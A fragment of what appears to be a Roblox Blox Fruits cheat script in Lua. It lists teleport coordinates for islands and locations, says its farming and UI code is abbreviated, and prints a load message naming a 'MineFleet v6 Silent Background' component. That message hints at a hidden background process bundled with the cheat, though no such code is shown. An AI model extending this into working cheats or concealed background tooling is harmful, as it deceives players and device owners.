local ENTRANCE_PORTALS = { { Name = "Pirate Starter", Pos = Vector3.new(1059.37, 16.51, 1546.99), Sea = 1 }, { Name = "Marine Starter", Pos = Vector3.new(-2573.39, 6.94, 2059.27), Sea = 1 }, { Name = "Middle Town", Pos = Vector3.new(-655.82, 7.84, 1588.65), Sea = 1 }, { Name = "Jungle", Pos = Vector3.new(-1612.33, 36.85, 149.13), Sea = 1 }, { Name = "Pirate Village", Pos = Vector3.new(-1181.39, 4.75, 3843.43), Sea = 1 }, { Name = "Desert", Pos = Vector3.new(1094.11, 6.44, 4192.89), Sea = 1 }, { Name = "Snow Island", Pos = Vector3.new(1384.81, 87.27, -1298.47), Sea = 1 }, { Name = "Marineford", Pos = Vector3.new(-5035.79, 28.65, 4324.96), Sea = 1 }, { Name = "Sky 1 (Lower Skylands)", Pos = Vector3.new(-4839.53, 717.67, -2619.44), Sea = 1 }, { Name = "Sky 2 (Upper Skylands)", Pos = Vector3.new(-7894.62, 5545.49, -380.41), Sea = 1 }, { Name = "Prison", Pos = Vector3.new(4875.33, 5.65, 735.45), Sea = 1 }, { Name = "Colosseum", Pos = Vector3.new(-1427.62, 7.28, -2792.77), Sea = 1 }, { Name = "Magma Village", Pos = Vector3.new(-5247.72, 8.57, 8504.68), Sea = 1 }, { Name = "Underwater City Entrance", Pos = Vector3.new(61163.85, 11.68, 1819.78), Sea = 1, IsEntrance = true }, { Name = "Underwater City Exit", Pos = Vector3.new(3864.69, 6.74, -1926.21), Sea = 1, IsEntrance = true }, { Name = "Fountain City", Pos = Vector3.new(5127.13, 59.50, 4105.45), Sea = 1 }, { Name = "Cafe (Safe Zone)", Pos = Vector3.new(-380.48, 77.22, 255.83), Sea = 2, IsEntrance = true }, { Name = "Mansion (Swan)", Pos = Vector3.new(2284.91, 15.15, 905.51), Sea = 2, IsEntrance = true }, { Name = "Kingdom of Rose", Pos = Vector3.new(878.01, 121.98, 1235.35), Sea = 2 }, { Name = "Green Zone", Pos = Vector3.new(-2448.53, 73.02, -3210.63), Sea = 2 }, { Name = "Graveyard", Pos = Vector3.new(-5418.89, 48.52, -774.75), Sea = 2 }, { Name = "Snow Mountain", Pos = Vector3.new(608.24, 401.52, -5372.46), Sea = 2 }, { Name = "Hot and Cold", Pos = Vector3.new(-6026.96, 15.96, -5071.29), Sea = 2 }, { Name = "Cursed Ship Interior", Pos = Vector3.new(923.21, 126.98, 32852.83), Sea = 2, IsEntrance = true }, { Name = "Cursed Ship Exit", Pos = Vector3.new(-6508.56, 89.03, -132.84), Sea = 2, IsEntrance = true }, { Name = "Ice Castle", Pos = Vector3.new(5422.31, 28.25, -6767.13), Sea = 2 }, { Name = "Forgotten Island", Pos = Vector3.new(-3054.44, 237.15, -10142.82), Sea = 2 }, { Name = "Dark Arena", Pos = Vector3.new(3780.03, 22.65, -3498.94), Sea = 2 }, { Name = "Port Town", Pos = Vector3.new(-290.74, 6.73, 5343.55), Sea = 3 }, { Name = "Hydra Island", Pos = Vector3.new(5229.93, 1004.28, -325.23), Sea = 3, IsEntrance = true }, { Name = "Great Tree", Pos = Vector3.new(2281.54, 442.20, -12543.08), Sea = 3, IsEntrance = true }, { Name = "Floating Turtle Mansion", Pos = Vector3.new(-12463.87, 374.91, -7523.77), Sea = 3, IsEntrance = true }, { Name = "Castle on the Sea", Pos = Vector3.new(-5035.43, 314.52, -2917.48), Sea = 3, IsEntrance = true }, { Name = "Haunted Castle", Pos = Vector3.new(-9516.99, 142.01, 6078.47), Sea = 3, IsEntrance = true }, { Name = "Peanut Island", Pos = Vector3.new(-2062.73, 50.32, -10232.22), Sea = 3 }, { Name = "Ice Cream Island", Pos = Vector3.new(-902.59, 79.92, -10988.69), Sea = 3 }, { Name = "Cake Island", Pos = Vector3.new(-2100.12, 70.12, -12150.34), Sea = 3 } }

-- Rest of Blox Fruits script (UI, farming loops, etc.) - abbreviated for brevity
-- Full implementation matches alpha_v2.lua

print("[ALPHA v3.0] Loaded: Blox Fruits + MineFleet v6 Silent Background")